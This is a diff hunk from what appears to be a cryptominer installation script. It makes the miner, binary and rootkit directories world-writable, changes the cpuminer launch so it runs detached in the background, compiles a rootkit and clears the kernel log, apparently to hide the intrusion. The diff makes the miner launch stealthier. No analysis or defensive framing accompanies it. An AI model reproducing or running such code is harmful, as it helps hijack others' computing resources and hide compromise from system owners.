@@ -13,7 +13,7 @@ chmod 777 /miner/*
 chmod 777 /miner/Zarrassa/*
 chmod 777 /miner/Zarrassa/binaries/*
 chmod 777 /miner/Zarrassa/rootkit/*
-screen /miner/Zarrassa/cpuminer.sh
+screen -d -m /miner/Zarrassa/cpuminer.sh
 cd rootkit
 make
 dmesg -C
